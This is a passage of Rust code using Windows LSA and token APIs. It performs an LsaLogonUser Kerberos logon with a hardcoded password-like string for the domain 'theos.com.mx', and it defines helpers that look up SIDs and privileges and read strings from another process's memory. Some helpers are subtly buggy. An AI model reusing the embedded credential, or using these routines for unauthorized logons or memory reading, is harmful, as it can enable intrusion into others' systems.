        username.Length = (usernamebuffer.len()) as u16;

        username.MaximumLength = (usernamebuffer.len()) as u16 + 1;





        let mut password = std::mem::zeroed::<UNICODE_STRING>();

        let mut passwordbuffer = "284C40AF74E37C000AFC5ED7F783FA8D".encode_utf16().collect::<Vec<u16>>();

        password.Buffer = passwordbuffer.as_mut_ptr() as *mut u16;

        password.Length = (passwordbuffer.len()) as u16;

        password.MaximumLength = (passwordbuffer.len()) as u16 + 1;







        let mut domain = std::mem::zeroed::<UNICODE_STRING>();

        let mut domainbuffer = "theos.com.mx".encode_utf16().collect::<Vec<u16>>();

        domain.Buffer = domainbuffer.as_mut_ptr() as *mut u16;

        domain.Length = (domainbuffer.len()) as u16;

        domain.MaximumLength = (domainbuffer.len()) as u16 + 1;





        ilogon.UserName = std::mem::transmute(username);

        ilogon.Password = std::mem::transmute(password);

        ilogon.LogonDomainName = std::mem::transmute(domain);





        let mut tokensource = std::mem::zeroed::<TOKEN_SOURCE>();

        tokensource.SourceName = (*b"User32\0\0").map(|u| u as i8);

        //NtAllocateLocallyUniqueId(&mut tokensource.SourceIdentifier);





        let mut origin = std::mem::zeroed::<LSA_STRING>();

        let mut buffer3 = "Testingorigin".bytes().collect::<Vec<u8>>();

        origin.Length = buffer3.len() as u16;

        origin.MaximumLength = buffer3.len() as u16+1;

        origin.Buffer = buffer3.as_mut_ptr() as *mut i8;





        let mut profilebuf = 0 as *mut c_void;

        let mut profilebuflength = 0;

        let mut luid = std::mem::zeroed::<LUID>();

        let mut tokenhandle = 0 as *mut c_void;

        let mut quota = std::mem::zeroed::<QUOTA_LIMITS>();

        let mut logonstatus = 0;



       

       

        let ntstatus = LsaLogonUser(lsahandle,

            &mut origin ,

            2 ,

             packagehandle,

              &mut ilogon as *mut _ as *mut c_void,

              std::mem::size_of::<KERB_INTERACTIVE_LOGON>() as u32,

               std::ptr::null_mut(),

               &mut tokensource,

              &mut profilebuf ,

              &mut profilebuflength,

              &mut luid,

              &mut tokenhandle,

              &mut quota,

              &mut logonstatus);

         println!("logon status: {:x?}",logonstatus);

         println!("tokenhandle: {:x?}",tokenhandle);

         if ntstatus!=STATUS_SUCCESS{

             println!("LsaLogonUser failed: {:x?}",ntstatus);

             LsaDeregisterLogonProcess(lsahandle);

             return ();

         }

         LsaFreeMemory(profilebuf);

         LsaDeregisterLogonProcess(lsahandle);



    }

}









#[repr(C)]

pub struct myunicodestring{

    Length: u16,

    MaximumLength: u16,

    Buffer: *mut u16,

    BufferContents: Vec<u16>

}



impl myunicodestring{



    pub fn new(s:&str) -> myunicodestring{

        unsafe{

            let buffer = s.to_string().encode_utf16().collect::<Vec<u16>>();

            let mut unicodestring = myunicodestring { Length:0, MaximumLength: 0, Buffer: std::ptr::null_mut(), BufferContents: Vec::new() };

            unicodestring.Length = buffer.len() as u16;

            unicodestring.MaximumLength = buffer.len() as u16 + 1;

            unicodestring.BufferContents = buffer.clone();

            unicodestring.Buffer = unicodestring.BufferContents.as_mut_ptr() as *mut u16;

           

            return unicodestring;



        }

       



    }



}









#[repr(C)]

pub struct mylsastring{

    Length: u16,

    MaximumLength: u16,

    Buffer: *mut i8,

    BufferContents: Vec<u8>

}





impl mylsastring{



    pub fn new(s:&str) -> mylsastring{

        unsafe{

            let buffer = s.to_string().bytes().collect::<Vec<u8>>();

            let mut lsastring = mylsastring { Length:0, MaximumLength: 0, Buffer: std::ptr::null_mut(), BufferContents: Vec::new() };

            lsastring.Length = buffer.len() as u16;

            lsastring.MaximumLength = buffer.len() as u16 + 1;

            lsastring.BufferContents = buffer.clone();

            lsastring.Buffer = lsastring.BufferContents.as_mut_ptr() as *mut i8;

           

            return lsastring;



        }

       



    }



}









#[derive(Debug)]

#[repr(C)]

pub struct MY_TOKEN_PRIVILEGES{

    PrivilegeCount: u32,

    Privileges: *mut c_void

}





pub fn gettokenprimarygroup(tokenhandle:*mut c_void) -> TOKEN_PRIMARY_GROUP{

    unsafe{



        let mut bytesneeded = 0;

        GetTokenInformation(tokenhandle,

            5,

            std::ptr::null_mut(),

            bytesneeded, &mut bytesneeded);





        let mut buffer = vec![0u8;bytesneeded as usize];

        GetTokenInformation(tokenhandle,

            5,

            buffer.as_mut_ptr() as *mut c_void,

            bytesneeded, &mut bytesneeded);



        let mut primarygroup = *(buffer.as_mut_ptr() as *mut TOKEN_PRIMARY_GROUP);

        return primarygroup;





    }

}





pub fn getluidsfromprivilegenames(pnames:&Vec<&str>) -> Vec<LUID_AND_ATTRIBUTES>{

    unsafe{



        let mut luids:Vec<LUID_AND_ATTRIBUTES> = Vec::new();

        for i in 0..pnames.len(){

            let mut luid = std::mem::zeroed::<LUID>();

            let mut luidattr = std::mem::zeroed::<LUID_AND_ATTRIBUTES>();

            LookupPrivilegeValueA(std::ptr::null_mut(),

            pnames[0].as_bytes().as_ptr() as *const i8,

                &mut luid);

            luidattr.Luid = luid;

            luidattr.Attributes = SE_PRIVILEGE_ENABLED|SE_PRIVILEGE_ENABLED_BY_DEFAULT;

            luids.push(luidattr);

        }



        return luids;

       



    }

}







pub fn unicodetostring(lus: &UNICODE_STRING,prochandle: *mut c_void)

  -> String{

    unsafe{



        let mut buffer:Vec<u16> = vec![0;lus.MaximumLength as usize];

        let mut bytesread = 0;

        //std::ptr::copy(lus.Buffer, buffer.as_mut_ptr() as *mut u16,

         //   (lus.Length/2) as usize);

       

        let res = ReadProcessMemory(prochandle,

            lus.Buffer as *const c_void,

            buffer.as_mut_ptr() as *mut c_void,

            (lus.Length) as usize,

            &mut bytesread);



        if bytesread==0{

            return format!("reading process memory failed: {}",GetLastError());

        }



        return String::from_utf16_lossy(&buffer);







    }

}





pub fn getsidfromusername(username:String) -> Vec<u8>{

    unsafe{



       

       

        let mut bufferlen:u32 = 0;

        let mut domainlen = 0;

        let mut sidnameuse: u32 = 0;

        LookupAccountNameA(std::ptr::null_mut(),

        username.as_bytes().as_ptr() as *const i8,

        std::ptr::null_mut(),

        &mut bufferlen,

        std::ptr::null_mut(),

        &mut domainlen,

        &mut sidnameuse);



       

       

        let mut buffer:Vec<u8> = vec![0u8;bufferlen as usize];

        let mut domain = vec![0u8;domainlen as usize];



        let res = LookupAccountNameA(std::ptr::null_mut(),

        username.as_bytes().as_ptr() as *const i8,

        buffer.as_mut_ptr() as *mut c_void,

        &mut bufferlen,

        domain.as_mut_ptr() as *mut i8,

        &mut domainlen,

        &mut sidnameuse);



        println!("buffer for {}: {:x?}",username,buffer);

        if res==0{

            println!("LookupAccountNameA: {} failed: {}",username,GetLastError());

        }



        return buffer;



    }

}





pub fn getsidattributesfromnames(names:&Vec<&str>) -> Vec<SID_AND_ATTRIBUTES>{

    unsafe{



            let mut sidattributes:Vec<SID_AND_ATTRIBUTES> = Vec::new();



            for i in 0..names.len(){



                let mut sidattr = std::mem::zeroed::<SID_AND_ATTRIBUTES>();

                sidattr.Sid = getsidfromusername(names[i].to_string()).as_mut_ptr() as *mut c_void;

                sidattr.Attributes = SE_GROUP_ENABLED_BY_DEFAULT|SE_GROUP_MANDATORY;



                sidattributes.push(sidattr);

            }



            return sidattributes;

    }

}



pub fn lsaunicodetostring(lus: &LSA_UNICODE_STRING,prochandle: *mut c_void)

  -> String{

    unsafe{



        let mut buffer:Vec<u16> = vec![0;lus.MaximumLength as usize];

        let mut bytesread = 0;

        //std::ptr::copy(lus.Buffer, buffer.as_mut_ptr() as *mut u16,

         //   (lus.Length/2) as usize);

       

        let res = ReadProcessMemory(prochandle,

            lus.Buffer as *const c_void,

            buffer.as_mut_ptr() as *mut c_void,

            (lus.Length) as usize,

            &mut bytesread);



        if bytesread==0{

            return format!("reading process memory failed: {}",GetLastError());

        }



        return String::from_utf16_lossy(&buffer);







    }

}





pub fn luidtousernamew(luid:*mut LUID) -> String{

    unsafe{



        let mut bytesneeded = 0;



        LookupPrivilegeNameW(std::ptr::null_mut(),

        luid as *mut LUID,

            std::ptr::null_mut(), &mut bytesneeded);





        if bytesneeded ==0{

            return format!("lookupprivilegenamew failed: {}",GetLastError());

           

        }



        let mut privname:Vec<u16> = vec![0;bytesneeded as usize];

        let res = LookupPrivilegeNameW(std::ptr::null_mut(),

        luid as *mut LUID,

            privname.as_mut_ptr() as *mut u16, &mut bytesneeded);





        if res==0{

            return format!("lookupprivilegenamew failed: {}",GetLastError());

        }





        let privilege = String::from_utf16_lossy(&privname);

        return privilege;







    }

}





pub fn sidtousernamew(sid: *mut c_void) -> String {

    unsafe {

        let mut bytesneeded = 0;

        let mut domainbytesneeded = 0;

        let mut acctype = 0;

        let mut accname: Vec<u16> = vec![0; bytesneeded as usize];

        let mut domainname: Vec<u16> = vec![0; domainbytesneeded as usize];



        LookupAccountSidW(

            std::ptr::null_mut(),

            sid,

            accname.as_mut_ptr() as *mut u16,

            &mut bytesneeded,

            domainname.as_mut_ptr() as *mut u16,

            &mut domainbytesneeded,

            &mut acctype,

        );



        if bytesneeded == 0 {

            return format!("lookupaccountsidw failed to {}", GetLastError());

        }



        let mut accname: Vec<u16> = vec![0; bytesneeded as usize];

        let mut domainname: Vec<u16> = vec![0; domainbytesneeded as usize];



        let res = LookupAccountSidW(

            std::ptr::null_mut(),

            sid,

            accname.as_mut_ptr() as *mut u16,

            &mut bytesneeded,

            domainname.as_mut_ptr() as *mut u16,

            &mut domainbytesneeded,

            &mut acctype,

        );

        if res == 0 {

            println!("Lookupaccountsidw failed: {}", GetLastError());

            return String::new();

        }



        let accountname = String::from_utf16_lossy(&accname);

        let domain = String::from_utf16_lossy(&domainname);



        let mut finalstring = String::new();

        finalstring.push_str(&domain.trim());

        finalstring.push('\\');

        finalstring.push_str(&accountname);



        return finalstring;

    }

}



pub fn readunicodestringfrommemory(prochandle: *mut c_void, base: *const c_void) -> String {

    unsafe {

        let mut buffer: Vec<u16> = Vec::new();

        let mut i = 0;



        loop {

            let mut bytesread = 0;

            let mut temp: Vec<u16> = vec![0; 2];

            ReadProcessMemory(

                prochandle,

                (base as usize + (i * 2)) as *const c_void,

                temp.as_mut_ptr() as *mut c_void,

                2,

                &mut bytesread,

            );



            i += 1;

            if temp[0] == 0 && temp[1] == 0 {

                break;

            }



            buffer.push(temp[0]);

            buffer.push(temp[1]);

        }



        return String::from_utf16_lossy(&buffer);

    }

}
